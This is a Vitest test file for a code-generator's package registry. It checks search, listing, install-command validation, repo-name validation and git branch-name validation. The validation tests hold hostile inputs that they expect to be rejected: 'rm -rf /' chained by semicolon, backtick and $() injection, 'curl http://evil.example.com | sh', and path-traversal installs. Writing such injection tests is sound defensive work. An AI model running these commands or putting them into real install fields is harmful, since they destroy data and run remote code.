import { describe, it, expect } from 'vitest';
import {
  searchRegistry,
  listRegistry,
  installPackage,
  validateRegistryRepo,
  validateGitBranchName,
  type Registry,
  type RegistryPackage,
} from '../src/engine/registry.js';

// ---------------------------------------------------------------------------
// Test fixtures
// ---------------------------------------------------------------------------

const bundleSpring: RegistryPackage = {
  name: '@fixedcode/bundle-spring-domain',
  description: 'Spring Boot DDD domain bundle with Kotlin',
  version: '1.0.0',
  kind: 'bundle',
  tags: ['spring', 'kotlin', 'ddd'],
  author: 'fixedcode',
  repo: 'https://github.com/fixedcode-ai/bundle-spring-domain',
  install: 'npm install @fixedcode/bundle-spring-domain',
};

const generatorOpenapi: RegistryPackage = {
  name: '@fixedcode/generator-openapi',
  description: 'OpenAPI 3.0.3 spec generator from domain context',
  version: '2.0.0',
  kind: 'generator',
  tags: ['openapi', 'rest', 'api-spec'],
  author: 'fixedcode',
  install: 'npm install @fixedcode/generator-openapi',
};

const bundleHello: RegistryPackage = {
  name: '@fixedcode/bundle-hello-world',
  description: 'Minimal hello world bundle for testing',
  version: '0.1.0',
  kind: 'bundle',
  tags: ['example', 'starter'],
  author: 'community',
  install: 'npm install @fixedcode/bundle-hello-world',
};

const testRegistry: Registry = {
  version: 1,
  packages: [bundleSpring, generatorOpenapi, bundleHello],
};

// ---------------------------------------------------------------------------
// searchRegistry
// ---------------------------------------------------------------------------

describe('searchRegistry', () => {
  it('matches on name', () => {
    const results = searchRegistry(testRegistry, 'spring-domain');
    expect(results).toContain(bundleSpring);
    expect(results).not.toContain(generatorOpenapi);
  });

  it('matches on description', () => {
    const results = searchRegistry(testRegistry, 'OpenAPI 3.0.3');
    expect(results).toContain(generatorOpenapi);
    expect(results).not.toContain(bundleSpring);
  });

  it('matches on tags', () => {
    const results = searchRegistry(testRegistry, 'kotlin');
    expect(results).toContain(bundleSpring);
    expect(results).not.toContain(generatorOpenapi);
    expect(results).not.toContain(bundleHello);
  });

  it('matches on kind', () => {
    const results = searchRegistry(testRegistry, 'generator');
    expect(results).toContain(generatorOpenapi);
    expect(results).not.toContain(bundleSpring);
    expect(results).not.toContain(bundleHello);
  });

  it('is case-insensitive', () => {
    const lowerResults = searchRegistry(testRegistry, 'kotlin');
    const upperResults = searchRegistry(testRegistry, 'KOTLIN');
    const mixedResults = searchRegistry(testRegistry, 'KoTlIn');
    expect(lowerResults).toEqual(upperResults);
    expect(lowerResults).toEqual(mixedResults);
  });

  it('returns empty array when nothing matches', () => {
    const results = searchRegistry(testRegistry, 'xyzzy-no-match');
    expect(results).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// listRegistry
// ---------------------------------------------------------------------------

describe('listRegistry', () => {
  it('returns all packages when no kind filter is given', () => {
    const results = listRegistry(testRegistry);
    expect(results).toHaveLength(3);
    expect(results).toContain(bundleSpring);
    expect(results).toContain(generatorOpenapi);
    expect(results).toContain(bundleHello);
  });

  it('filters by kind — bundle', () => {
    const results = listRegistry(testRegistry, 'bundle');
    expect(results).toHaveLength(2);
    expect(results).toContain(bundleSpring);
    expect(results).toContain(bundleHello);
    expect(results).not.toContain(generatorOpenapi);
  });

  it('filters by kind — generator', () => {
    const results = listRegistry(testRegistry, 'generator');
    expect(results).toHaveLength(1);
    expect(results).toContain(generatorOpenapi);
  });

  it('returns empty array when kind has no matches', () => {
    const results = listRegistry(testRegistry, 'plugin');
    expect(results).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// installPackage — input validation only
// ---------------------------------------------------------------------------

describe('installPackage — input validation', () => {
  const projectDir = '/tmp';

  it('throws for a command containing shell metacharacters', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install foo; rm -rf /',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for a command that uses backtick injection', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install `whoami`',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for a command that is not npm install', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'curl http://evil.example.com | sh',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for a command with a space-separated extra argument beyond a single package', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install foo bar',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws with the offending command in the error message', () => {
    const cmd = 'npm install $(evil)';
    const malicious: RegistryPackage = { ...bundleSpring, install: cmd };
    expect(() => installPackage(malicious, projectDir)).toThrow(`Unsafe install command: ${cmd}`);
  });

  it('throws for an install path that escapes via ..', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install ../../backdoor',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for an install path that escapes via @scope/../foo', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install @scope/../etc/evil',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for an install path that is absolute', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install /etc/evil',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for an install path starting with .', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install ./local-pkg',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('rejects an empty install string', () => {
    const malicious: RegistryPackage = { ...bundleSpring, install: '' };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });
});

// Note: full installPackage success path requires a writable projectDir and
// a real `npm install` invocation; we exercise validation only here. The
// patterns below are the same as those used in installPackage's allow-list.

import {} from // Re-import to access the internal helper through the module's barrel:
// tests rely on the public side-effect (throw / no-throw) of installPackage.
'../src/engine/registry.js';

describe('install allow-list — github: refs', () => {
  const projectDir = '/tmp/__never_used__';
  it('accepts npm install github:owner/repo', () => {
    const pkg: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install github:fixedcode-ai/bundle-x',
    };
    // Will throw because projectDir is bogus when execFileSync runs;
    // we want the validator to NOT throw "Unsafe install command".
    expect(() => installPackage(pkg, projectDir)).not.toThrow(/Unsafe install command/);
  });
  it('accepts npm install github:owner/repo#ref', () => {
    const pkg: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install github:fixedcode-ai/bundle-x#main',
    };
    expect(() => installPackage(pkg, projectDir)).not.toThrow(/Unsafe install command/);
  });
  it('rejects npm install github:owner/../etc', () => {
    const pkg: RegistryPackage = { ...bundleSpring, install: 'npm install github:owner/../etc' };
    expect(() => installPackage(pkg, projectDir)).toThrow('Unsafe install command');
  });
});

describe('install allow-list — npm version ranges', () => {
  const projectDir = '/tmp/__never_used__';
  it('accepts a caret range', () => {
    const pkg: RegistryPackage = { ...bundleSpring, install: 'npm install foo@^1.2.3' };
    expect(() => installPackage(pkg, projectDir)).not.toThrow(/Unsafe install command/);
  });
  it('accepts a tilde range', () => {
    const pkg: RegistryPackage = { ...bundleSpring, install: 'npm install foo@~1.2' };
    expect(() => installPackage(pkg, projectDir)).not.toThrow(/Unsafe install command/);
  });
});

describe('validateRegistryRepo', () => {
  it('accepts a normal owner/repo', () => {
    expect(() => validateRegistryRepo('fixedcode-ai/registry')).not.toThrow();
  });

  it('accepts repo names with dots and underscores', () => {
    expect(() => validateRegistryRepo('user_name/repo.name')).not.toThrow();
  });

  it('rejects flag-style values that gh might interpret as options', () => {
    expect(() => validateRegistryRepo('--help')).toThrow(/invalid registry repo/i);
    expect(() => validateRegistryRepo('-R x/y')).toThrow(/invalid registry repo/i);
  });

  it('rejects values without exactly one slash', () => {
    expect(() => validateRegistryRepo('justtext')).toThrow(/invalid registry repo/i);
    expect(() => validateRegistryRepo('a/b/c')).toThrow(/invalid registry repo/i);
  });

  it('rejects values with spaces', () => {
    expect(() => validateRegistryRepo('foo bar/baz')).toThrow(/invalid registry repo/i);
  });

  it('rejects empty string', () => {
    expect(() => validateRegistryRepo('')).toThrow(/invalid registry repo/i);
  });

  it('rejects shell metacharacters', () => {
    expect(() => validateRegistryRepo('foo/bar;rm -rf')).toThrow(/invalid registry repo/i);
    expect(() => validateRegistryRepo('foo/bar`whoami`')).toThrow(/invalid registry repo/i);
  });
});

describe('validateGitBranchName — F-6', () => {
  it('accepts a normal kebab branch', () => {
    expect(() => validateGitBranchName('add-spring-domain')).not.toThrow();
  });
  it('accepts feature branches with slashes', () => {
    expect(() => validateGitBranchName('feature/abc-123')).not.toThrow();
  });
  it('rejects a leading dash', () => {
    expect(() => validateGitBranchName('-help')).toThrow(/Invalid git branch/i);
  });
  it('rejects empty', () => {
    expect(() => validateGitBranchName('')).toThrow(/Invalid git branch/i);
  });
  it('rejects spaces', () => {
    expect(() => validateGitBranchName('foo bar')).toThrow(/Invalid git branch/i);
  });
  it('rejects "..": git ref-format violation', () => {
    expect(() => validateGitBranchName('foo..bar')).toThrow(/Invalid git branch/i);
  });
  it('rejects @{...}', () => {
    expect(() => validateGitBranchName('foo@{1}')).toThrow(/Invalid git branch/i);
  });
  it('rejects trailing /', () => {
    expect(() => validateGitBranchName('foo/')).toThrow(/Invalid git branch/i);
  });
  it('rejects trailing .lock', () => {
    expect(() => validateGitBranchName('foo.lock')).toThrow(/Invalid git branch/i);
  });
});
